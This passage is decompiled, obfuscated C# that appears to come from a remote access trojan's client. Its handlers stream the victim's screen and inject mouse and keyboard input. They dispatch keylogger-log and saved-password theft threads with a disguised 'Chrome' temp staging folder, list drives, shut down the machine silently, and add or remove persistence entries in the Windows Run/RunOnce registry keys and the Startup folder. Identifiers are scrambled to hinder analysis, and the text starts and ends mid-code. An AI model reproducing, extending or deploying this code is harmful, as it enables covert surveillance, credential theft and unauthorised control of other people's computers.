      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
    }
    BitmapData bitmapdata = (BitmapData) null;
    Bitmap bitmap = (Bitmap) null;
    try
    {
      bitmap = 걄\uE704락艿\uE5A8倩\uF830箔泻髇䠽\u10FB非䶓붇弝䬆ᷟ䵑䔥.狪䊦츒\uE940탤츼\uF442긽\uEE71鏧ݛ\u3336\uA7F3鞕쒬ഈ嫳\u2984Ɔ諬(command.Monitor);
      bitmapdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
      using (MemoryStream outStream = new MemoryStream())
      {
        if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 == null)
          throw new Exception("StreamCodec can not be null.");
        匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.CodeImage(bitmapdata.Scan0, new Rectangle(0, 0, bitmap.Width, bitmap.Height), new Size(bitmap.Width, bitmap.Height), bitmap.PixelFormat, (Stream) outStream);
        new GetDesktopResponse(outStream.ToArray(), 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.ImageQuality, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Monitor, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Resolution).Execute(client);
      }
    }
    catch (Exception ex)
    {
      if (匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 != null)
        new GetDesktopResponse((byte[]) null, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.ImageQuality, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Monitor, 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍.Resolution).Execute(client);
      匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\uED4D늸멗䤺䰽麠\uE80Eᷥ값䜿钬쭙ꋐ깻僷\uEEB9䆺\uFFFD晷髍 = (UnsafeStreamCodec) null;
    }
    finally
    {
      if (bitmap != null)
      {
        if (bitmapdata != null)
        {
          try
          {
            bitmap.UnlockBits(bitmapdata);
          }
          catch
          {
          }
        }
        bitmap.Dispose();
      }
    }
  }

  public static void 謩藾ꈹ돰灏\u31E5\u3283ﻹ奭勺廸픛凚㔑㳍ᔀ㯥ኁቓୂ(
    DoMouseEvent command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      Screen[] allScreens = Screen.AllScreens;
      int x = allScreens[command.MonitorIndex].Bounds.X;
      int y = allScreens[command.MonitorIndex].Bounds.Y;
      Point p = new Point(command.X + x, command.Y + y);
      switch (command.Action)
      {
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.걘剫툠\u1CAC\u0E77飫佺\uEAB1ퟯᩔ猶ఀᚈ滯闗줊븷\uFFFD뤜ᔞ:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.丏ƅ캇菨ᅾ슰놷ಮ复쟺씙\uEEE9盰픸陋Ⱇ떚\u0CF9糤洰:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.\uF353铈濤ᘩᇵꌓ遷\uE8A8䪆湞㵝\u2598ﮤ炛枤綤抱䔺敕ꄭ:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.䱜ꦼ캼퐔䰳᪴㝆\u2E51\u2A8A홎\uE81A\uF7F1㣄\u2085Խ髅䊧\uFFFD쨯ꗊ:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.霨뇽\u4DEBⷠ\uFFFD\uEB3F\u181B啹訧\u2AAC厢柖\u27C3뾻먁㱑覥\u0B49찿翘:
          if (㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.\uE58A蔬\uFFFDꦈ丕\uF4D9勵\uF752窎劣\u3312昇굋߰征䔧䂦시쐪灰())
          {
            㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.级닓ꉂ\u2F18\u278F\u27BA睅\u0B53稪ᘣ齵鶔鱗酡Ꝃ篞ꗁ\u2105賔祼();
            break;
          }
          break;
      }
      switch (command.Action)
      {
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.걘剫툠\u1CAC\u0E77飫佺\uEAB1ퟯᩔ猶ఀᚈ滯闗줊븷\uFFFD뤜ᔞ:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.丏ƅ캇菨ᅾ슰놷ಮ复쟺씙\uEEE9盰픸陋Ⱇ떚\u0CF9糤洰:
          㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.济\u21C3\u28B8㡘\u2768臁\u2F22巩ꂗ\uEC98ﱦ\u070D圕\u0BE5箶郥閒龽ꂈ阓(p, command.IsMouseDown);
          break;
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.\uF353铈濤ᘩᇵꌓ遷\uE8A8䪆湞㵝\u2598ﮤ炛枤綤抱䔺敕ꄭ:
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.䱜ꦼ캼퐔䰳᪴㝆\u2E51\u2A8A홎\uE81A\uF7F1㣄\u2085Խ髅䊧\uFFFD쨯ꗊ:
          㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.䮅祉\uE1F2\uF31F䬙홒ᆁ蚒ꛍ閥並ḭ죊岂\u007Dℊß묇杩鷋(p, command.IsMouseDown);
          break;
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.霨뇽\u4DEBⷠ\uFFFD\uEB3F\u181B啹訧\u2AAC厢柖\u27C3뾻먁㱑覥\u0B49찿翘:
          㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.嚙ᗹ讯䣀㒥입䧞\uE835\uEFA6ᝀꝒ\uEC7E\u05FA\u3250밟耥揱憻\uFFFD밷(p);
          break;
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.גּ\u0ACE쓟难檥敂\uECE2뇼失壜ូ\uFFFD炴릡ⳉ㒗畀萉\u0EE2\uE21F:
          㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.줐䐟\u4DF6\u286D蜳\uF84E策\u1AF9\u003F鑯䂻梇珨ﮘ\u2F4Cᇘ暍㗒쉃ᳫ(p, false);
          break;
        case 徟괹㮧쨓\u02E7\uEE2Cꙧʥ칶傛簵ﶠ㥃겴\u290F瓔衺\uEB31㬖\uE287.\u1362吅绗冬巺驊㡗걀䶄줶ꌳʭ鉵റ煶븐畛Ԓ廍\u0384:
          㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.줐䐟\u4DF6\u286D蜳\uF84E策\u1AF9\u003F鑯䂻梇珨ﮘ\u2F4Cᇘ暍㗒쉃ᳫ(p, true);
          break;
      }
    }
    catch
    {
    }
  }

  public static void \u103B摩ꖜླྀ\u2570\uFFFD鹩\uF4C8Ԅ齪愿콜ᒱ냕퓿朠蔑\uE3E9ꔘ䯦(
    DoKeyboardEvent command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.\uE58A蔬\uFFFDꦈ丕\uF4D9勵\uF752窎劣\u3312昇굋߰征䔧䂦시쐪灰())
      㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.级닓ꉂ\u2F18\u278F\u27BA睅\u0B53稪ᘣ齵鶔鱗酡Ꝃ篞ꗁ\u2105賔祼();
    㥔棧鮔澋आ䓷စ陸葅\u2B95켪漲ꇿﲀ習䖴ϻ넹걹镾.꿪搮\u09CF霐蕫ꑋ詑状ᦖ鬻\u23F0\uF243ƴꊋ닲\uF624\u1AF9壱曗ࠐ(command.Key, command.KeyDown);
  }

  public static void 䅖熮ج\uF363컺噾Ǥ誏ᜅࢦ\uA7CE䶳痏ᜳु铰డ岺嗔\uF847(
    GetMonitors command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    if (Screen.AllScreens.Length == 0)
      return;
    new GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
  }

  public static void ꔃ\uFFFD\u2108\u2BC7\uF116痘孖ꪘ媽䧎\u0F48炦ఈຣ\u1AD7喱\u2196\u0BDA畣厎(
    GetKeyloggerLogs command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.돥ﹽ䭿䨫䬧쇭爹\uE812\u0D49煥\uEEA4瀵䈼蜼\u2A58\uABFD㪤옕図쭄()
    {
      偿୮ፒ실ꬫ岨㐢爌㷻鋈籨㲮軾馄蜼\u22C4醖\uE8BF㹝胨 = client
    }.聂祦롒㕓贲줗켳솪峞\u2947뢐갲站鱎씏ӫ巕ᕀ燊깸)).Start();
  }

  public static string PassDirectory => Path.Combine(Path.GetTempPath(), "Chrome\\Directory\\Browsers\\");

  public static void \uEE43১\u3321๓ڳꍅ\u2E03\uAAFE\uE286叧㟐\u1CB4쯚畫쬀鍂ꈼ娞啶㢀(
    GetAllPasswords command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: reference to a compiler-generated method
    new Thread(new ThreadStart(new 匔焴䈯祃䐸韰貶暒か揕俌병犹溏뜦\u2CE9\u27E5蕱㫂ȯ.\u2B39\u32EB埘䳋\uF588퐝\uF65DỀ\uFFFD砹坘撨糙큵䴋꾁釭㹲\uE2C1\u3358()
    {
      챠뗭괋拓飛趦둧唹䰃㿣\uFFFD毖\uE03F몋仳\uE24Eᤉ黌氎쪁 = client
    }.㺜痢䬷\u256D껽\u228C뻓뽵异꺥筈\u29C6ᷨ\u3289뺐巴딽ᡟ㓄齃)).Start();
  }

  public static void 딶ᡞ䔒쎕钚蠧痟͈嗨\uF17Dꡕ濮\uF6D3㔵㡧콢㮝\uF4E5毶\u2619(
    GetDrives command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    DriveInfo[] array;
    try
    {
      array = ((IEnumerable<DriveInfo>) DriveInfo.GetDrives()).Where<DriveInfo>((Func<DriveInfo, bool>) (d => d.IsReady)).ToArray<DriveInfo>();
    }
    catch (IOException ex)
    {
      new SetStatusFileManager("GetDrives I/O error", false).Execute(client);
      return;
    }
    catch (UnauthorizedAccessException ex)
    {
      new SetStatusFileManager("GetDrives No permission", false).Execute(client);
      return;
    }
    if (array.Length == 0)
    {
      new SetStatusFileManager("GetDrives No drives", false).Execute(client);
    }
    else
    {
      string[] driveDisplayName = new string[array.Length];
      string[] rootDirectory = new string[array.Length];
      for (int index = 0; index < array.Length; ++index)
      {
        string str = (string) null;
        try
        {
          str = array[index].VolumeLabel;
        }
        catch
        {
        }
        if (string.IsNullOrEmpty(str))
          driveDisplayName[index] = string.Format("{0} [{1}, {2}]", (object) array[index].RootDirectory.FullName, (object) ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.䊪ꊅ窘྄ퟅ䔻㴈º\uE4D4岹㱇\u2833\u2389\uFFFD\uEFF8\uE7ABឭ淦榏椝(array[index].DriveType), (object) array[index].DriveFormat);
        else
          driveDisplayName[index] = string.Format("{0} ({1}) [{2}, {3}]", (object) array[index].RootDirectory.FullName, (object) str, (object) ﾘ皹陵崎瑭쮶묻園䜡곎艔ꄗ̫るᷚư곀ꚠꛬ㢜.䊪ꊅ窘྄ퟅ䔻㴈º\uE4D4岹㱇\u2833\u2389\uFFFD\uEFF8\uE7ABឭ淦榏椝(array[index].DriveType), (object) array[index].DriveFormat);
        rootDirectory[index] = array[index].RootDirectory.FullName;
      }
      new GetDrivesResponse(driveDisplayName, rootDirectory).Execute(client);
    }
  }

  public static void 瑛턻쨷㔃\uE1A1ナ햝쩶縧緻䌇栠\u2ED6蒑첗\uF314彼\uE054嗩猒(
    DoShutdownAction command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      ProcessStartInfo startInfo = new ProcessStartInfo();
      switch (command.Action)
      {
        case 皝큘䁎걝엕\uFFFDᡷ\u22C2\uFFFD멶\uFFFD텎؅惦䇵ﱲ瓕ꗥꌒ켜.뱆텦溋ㅇ\uFFFD菶ˊ憽滑\u0F98\u4DD0竛\uF4EE毬㵉ߙ\u2B17\u09FF\uFFFD㹧:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/s /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case 皝큘䁎걝엕\uFFFDᡷ\u22C2\uFFFD멶\uFFFD텎؅惦䇵ﱲ瓕ꗥꌒ켜.퇤ꖵ辴荩鮙\uFFFD㑬䤥ゅ댵֩\uFFFD\uDB0C\uDE1E\u25A0䈨둘ꘖ멒澇:
          startInfo.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo.UseShellExecute = true;
          startInfo.Arguments = "/r /t 0";
          startInfo.FileName = "shutdown";
          Process.Start(startInfo);
          break;
        case 皝큘䁎걝엕\uFFFDᡷ\u22C2\uFFFD멶\uFFFD텎؅惦䇵ﱲ瓕ꗥꌒ켜.ꋶ翷췬ᢥ䖉㱚\uF88A\u2F81\u32A5ﭟꍬ\uEF20ꁦ\u21BA러\uF565⃓鼻悊叺:
          Application.SetSuspendState(PowerState.Suspend, true, true);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Action failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void ᰡ㩴\uF13D憎䉿쒀ጕ别覐傡ꄛ粆変麭袧嘋뎔홧\u06FD뉮(
    GetStartupItems command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      List<string> startupitems = new List<string>();
      using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "0" + formattedKeyValue)));
      }
      using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "1" + formattedKeyValue)));
      }
      using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "2" + formattedKeyValue)));
      }
      using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
      {
        if (key != null)
          startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "3" + formattedKeyValue)));
      }
      if (㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit)
      {
        using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "4" + formattedKeyValue)));
        }
        using (RegistryKey key = 釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u0FD2劈새㧥㩍䄅ᇭ븡鈕卮ອꎢ簦ᱫⵃ춵ꩫ\uF706罒楨(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
        {
          if (key != null)
            startupitems.AddRange(key.GetFormattedKeyValues().Select<string, string>((Func<string, string>) (formattedKeyValue => "5" + formattedKeyValue)));
        }
      }
      if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
      {
        FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
        startupitems.AddRange(((IEnumerable<FileInfo>) files).Where<FileInfo>((Func<FileInfo, bool>) (file => file.Name != "desktop.ini")).Select<FileInfo, string>((Func<FileInfo, string>) (file => string.Format("{0}||{1}", (object) file.Name, (object) file.FullName))).Select<string, string>((Func<string, string>) (formattedKeyValue => "6" + formattedKeyValue)));
      }
      new GetStartupItemsResponse(startupitems).Execute(client);
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Getting Autostart Items failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void ퟗ\uF0D2츃媦ꔳ呬\uE1C6桇椢弡쨗핍쵞䏉\u0C73钼쐙㴉̸\u33B9(
    DoStartupItemAdd command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 1:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 2:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 3:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 4:
          if (!㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 5:
          if (!㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.\u24D8ᇶ\u278F䗅\uA7C2珜쨥མ瘝硞寞\uE2D2腌엚\uEFC9\u0F05\uE615\uE4A2㓆ᷧ(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name, command.Path, true))
            break;
          throw new Exception("Could not add value");
        case 6:
          if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
          using (StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name + ".url"), false))
          {
            streamWriter.WriteLine("[InternetShortcut]");
            streamWriter.WriteLine("URL=file:///" + command.Path);
            streamWriter.WriteLine("IconIndex=0");
            streamWriter.WriteLine("IconFile=" + command.Path.Replace('\\', '/'));
            streamWriter.Flush();
            break;
          }
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Adding Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void ჽﮦ臌\u2E08缭ᡒ㑬\u2984\u2824\u2025쭛릗뚸\uFBCE宴吽\u2881ꢩ뉢桯(
    DoStartupItemRemove command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      switch (command.Type)
      {
        case 0:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 1:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 2:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 3:
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 4:
          if (!㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 5:
          if (!㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit)
            throw new NotSupportedException("Only on 64-bit systems supported");
          if (釯\u2661嶝䩕૧\uEA63蘙콭樱\u29B3ए콟矾딙Ṍ믮씪렧䔭Ǌ.効燐ﶷ\u0F15吖瑰媞래됕妋ȓ䦊\uED8F欰㿓뷽\uE640谰菌潸(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
            break;
          throw new Exception("Could not remove value");
        case 6:
          string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
          if (!System.IO.File.Exists(path))
            throw new IOException("File does not exist");
          System.IO.File.Delete(path);
          break;
      }
    }
    catch (Exception ex)
    {
      new SetStatus(string.Format("Removing Autostart Item failed: {0}", (object) ex.Message)).Execute(client);
    }
  }

  public static void 澵폱跖䒃ᘦ\uFFFD椚\u173B翞ⱶ栯䣥敼\u2F4A詏樜嵈\uFFFD뗾乡(
    GetSystemInfo command,
    鸳\u02E9ܨ蝦\uF41F叕㞘\u24B1承\uF83D\uFFFD愾鋡ꠐ솞㡶Λ묠ᑜ㩨 client)
  {
    try
    {
      IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
